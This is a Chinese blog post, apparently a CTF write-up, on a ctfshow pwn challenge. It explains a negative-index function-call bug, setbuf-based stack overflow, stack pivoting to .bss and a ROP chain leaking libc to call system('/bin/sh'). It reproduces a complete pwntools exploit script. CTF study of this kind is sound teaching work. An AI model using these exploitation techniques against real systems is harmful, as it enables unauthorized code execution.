@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="学习给自己的">
+    <meta name="description" content="一天一步，总会到的">
+    <meta name="author" content="LOLOLO">
+    
+    <title>
+        
+            ctfshow签退题 |
+        
+        桥下少年
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"lololo-pwn.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/1.jpg","favicon":"/images/1.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"不要留恋过去,空想未来,专注当下。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                桥下少年
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">ctfshow签退题</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">LOLOLO</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2021-11-26 18:54:30</span>
+        <span class="mobile">2021-11-26 18:54</span>
+    </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.2k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>5 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="ctfshow-萌新赛pwn签退题"><a href="#ctfshow-萌新赛pwn签退题" class="headerlink" title="ctfshow 萌新赛pwn签退题"></a>ctfshow 萌新赛pwn签退题</h1><p>明明是叫萌新赛，整个签退题我以为很简单，拿到程序checksec一看，32位，竟然只开了NX，<strong>以为很简单</strong>；然后特么的写了几个月，从学栈开始，到格式化字符串、整数溢出，后面到堆，每次都会回来看一眼这题，丫的每次都不会，每次都™怀疑我学了个寂寞。</p>
+<blockquote>
+<p>完全参照大佬的博客完成，在最后会附上大佬的博客；本WP仅仅为了梳理本人对该题的理解</p>
+</blockquote>
+<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>程序几乎没有漏洞，可见的漏洞点存在于当进入选项3的流程时，会询问你是否对你的输入进行0-2的操作，然后判断你的选项是否小于等于2，如果是，就执行(0x804B048+choice)函数，此处存在漏洞，只进行了choice小于等于2的判断，而choice是整型，即可以输入负数，<strong>也就是说，我们几乎可以执行任何小于(0x804B048)的函数</strong></p>
+<p>这题需要利用setbuf函数，大部分pwn题当中，setbuf用来对标准输入输出流清零。仔细观察还会发现，stdin并不是0，而是在stdio库中设置的一个文件流，所以也是作用在stdio库中的函数，类似fwrite、fread、gets等函数。下面举个例子</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">char</span> buf1[<span class="number">10</span>];</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line">	setbuf(<span class="built_in">stdin</span>,buf);</span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line">	gets(buf1);</span><br><span class="line">	<span class="built_in">printf</span>(buf1);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述程序运行后buf1最后会直接输出用户输入buf中的内容。</p>
+<p>同时setbuf并没有设置长度的参数，设置长度需要使用setvbuf，所以默认情况下setbuf设置的缓冲区长度为默认的4096。</p>
+<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>通过输入操作选项，使得我们执行setbuf(fd=fopen(“/dev/null”), buf)函数，然后在0x08048742函数中调用了fwrite(ptr, 1u, n, s)往buf里面写入数据，这里我们选择最后一次输入的buf作为setbuf的第二个参数，然后构造栈溢出以及栈迁移。参考大佬的栈溢出构造逻辑如下：</p>
+<p>add(rop) -&gt; add(buf1) -&gt; buf(buf2) -&gt; add(buf3) -&gt; add(buf4) -&gt; setbuf(fd, buf4) -&gt; post(buf1) -&gt; post(rop) -&gt;  栈溢出，利用ROP链</p>
+<p>然后构造第一个ROP，这里利用printf泄露printf_got获得libc地址，找到system以及binsh的地址，同时构造fread读入向.bss段读入system以及binsh，再把栈迁移到写入了system以及binsh的.bss段。然后构造第二个ROP去执行system(“/bin/sh”)。</p>
+<p>最后会出现的问题</p>
+<p>.bss段是从0x804b000开始的，当把栈迁移到0x804b100时，会出现system执行binsh失败；大佬给出了两个原因</p>
+<ol>
+<li>当执行system时，system函数会获取系统的环境变量envp，而全局变量_environ指向了栈上的envp，当我们的rop链过长时，就有可能会覆盖了_environ的值，如果该值被覆盖成了无效地址，system就无法执行，但在这题中，因为第一个ROP链并不过长，所以并不会覆盖到该全局变量。</li>
+<li>system栈地址空间不足，程序的可读可写地址空间是从0x804b000-0x804c000，当我改栈地址为0x804b100时，可用空间只有0x100；所以将栈地址改为0x804b300以后都可以(这是试出来的)。</li>
+</ol>
+<p>附上大佬exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p, data</span>):</span></span><br><span class="line">    p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&quot;contents: &quot;</span>)</span><br><span class="line">    p.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">p, n, offset</span>):</span></span><br><span class="line">    p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.readuntil(<span class="string">&quot;ID (0-4): &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(n))</span><br><span class="line">    p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span>(<span class="params">p</span>):</span></span><br><span class="line">    p.readuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    p = process(<span class="string">&quot;./mailer&quot;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    e = ELF(<span class="string">&quot;./mailer&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    gadget1 = <span class="number">0x08048dab</span>   <span class="comment"># pop ebp ; ret</span></span><br><span class="line">    gadget2 = <span class="number">0x080485f8</span>   <span class="comment"># leave ; ret</span></span><br><span class="line">    gadget3 = <span class="number">0x08048495</span>   <span class="comment"># pop ebx ; ret</span></span><br><span class="line">    gadget4 = <span class="number">0x08048daa</span>   <span class="comment"># pop edi ; pop ebp ; ret</span></span><br><span class="line">    gadget5 = <span class="number">0x08048da9</span>   <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">    one_gadget_sh = <span class="number">0x56ff5</span></span><br><span class="line">    read_buf = <span class="number">0x080486D9</span></span><br><span class="line">    stdin_bss = <span class="number">0x804B060</span></span><br><span class="line">    bss_buf = <span class="number">0x804b700</span></span><br><span class="line">    rop1 = <span class="string">&quot;a&quot;</span>*<span class="number">0xd</span></span><br><span class="line">    rop1 += p32(e.symbols[<span class="string">&quot;printf&quot;</span>]) + p32(gadget3) + p32(e.got[<span class="string">&quot;printf&quot;</span>]) <span class="comment"># printf(&amp;printf)</span></span><br><span class="line">    rop1 += p32(read_buf) + p32(gadget4) + p32(bss_buf) + p32(<span class="number">0x100</span>) <span class="comment"># fread(buf, 1, 0x100, stdin)</span></span><br><span class="line">    rop1 += p32(gadget1) + p32(bss_buf) + p32(gadget2) + p32(bss_buf)</span><br><span class="line">    add(p, rop1)</span><br><span class="line">    add(p, <span class="string">&quot;b&quot;</span>*<span class="number">255</span>)</span><br><span class="line">    add(p, <span class="string">&quot;c&quot;</span>*<span class="number">255</span>)</span><br><span class="line">    add(p, <span class="string">&quot;d&quot;</span>*<span class="number">255</span>)</span><br><span class="line">    add(p, <span class="string">&quot;e&quot;</span>*<span class="number">255</span>)</span><br><span class="line">    post(p, <span class="number">4</span>, -<span class="number">15</span>)</span><br><span class="line">    post(p, <span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    post(p, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    quit(p)</span><br><span class="line">    p.readuntil(<span class="string">&quot;:)\n&quot;</span>)</span><br><span class="line">    printf_got = u32(p.read(<span class="number">4</span>))</span><br><span class="line">    <span class="comment"># print hex(printf_got)</span></span><br><span class="line">    system_libc = libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    printf_libc = libc.symbols[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">    binsh_libc = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">    system_add = printf_got - printf_libc + system_libc</span><br><span class="line">    binsh_add =  printf_got - printf_libc + binsh_libc</span><br><span class="line">    one_gadget = printf_got - printf_libc + <span class="number">0x3a838</span></span><br><span class="line">    <span class="comment">#rop2 = &quot;aaaa&quot; + p32(gadget5) + p32(binsh_add+one_gadget_sh) + &quot;aaaa&quot; + p32(bss_buf) + p32(one_gadget)</span></span><br><span class="line">    rop2 = <span class="string">&quot;aaaa&quot;</span> + p32(system_add) + p32(binsh_add) + p32(binsh_add)</span><br><span class="line">    p.sendline(rop2)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>最后附上参考大佬的文章的<a class="link" target="_blank" rel="noopener" href="https://paper.seebug.org/450/">地址<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：ctfshow签退题</li>
+        <li>本文作者：LOLOLO</li>
+        <li>创建时间：2021-11-26 18:54:30</li>
+        <li>
+            本文链接：https://lololo-pwn.github.io/2021/11/26/ctfshow签退题/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/PWN/">#PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/12/30/hello-world/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Hello World</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/11/24/bins/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Bins</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">LOLOLO</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ctfshow-%E8%90%8C%E6%96%B0%E8%B5%9Bpwn%E7%AD%BE%E9%80%80%E9%A2%98"><span class="nav-number">1.</span> <span class="nav-text">ctfshow 萌新赛pwn签退题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-number">1.1.</span> <span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">解题思路</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
